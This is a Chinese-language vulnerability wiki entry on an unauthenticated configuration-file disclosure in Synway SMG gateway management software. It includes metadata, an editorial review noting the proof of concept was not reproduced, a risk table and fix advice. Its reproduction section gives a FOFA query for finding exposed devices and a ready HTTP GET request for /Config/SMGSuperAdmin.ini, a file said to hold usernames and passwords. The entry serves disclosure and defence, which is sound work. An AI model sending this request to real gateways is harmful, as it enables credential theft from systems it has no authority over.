---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-c61a9338edc6d83f84f15645"
entity_id: "ve-c61a9338edc6d83f84f15645"
schema_version: "1"
title: "三汇SMG网关管理软件 SMGSuperAdmin 信息泄露漏洞"
product: "Synway三汇SMG网关"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "配置端点可达、未给固件版本或认证对照"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/%E4%B8%89%E6%B1%87SMG%E7%BD%91%E5%85%B3/%E4%B8%89%E6%B1%87SMG%E7%BD%91%E5%85%B3%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6%20SMGSuperAdmin%20%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
---

# 三汇SMG网关管理软件 SMGSuperAdmin 信息泄露漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Synway三汇SMG网关
- 本文讨论：SMGSuperAdmin.ini配置泄露
- 版本、权限与配置前提：配置端点可达、未给固件版本或认证对照
- 资料类型：漏洞简报及请求示例；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 仅GET配置请求，无响应字段或登录对照；广泛影响和在野利用措辞无对应证据

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 配置中敏感字段、匿名访问与受影响固件未外部核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。

# 影响版本

三汇SMG网关管理软件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="Synway-网关管理软件"

POC/EXP：

GET /Config/SMGSuperAdmin.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close




# 漏洞修复

关闭互联网暴露面或接口设置访问控制

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
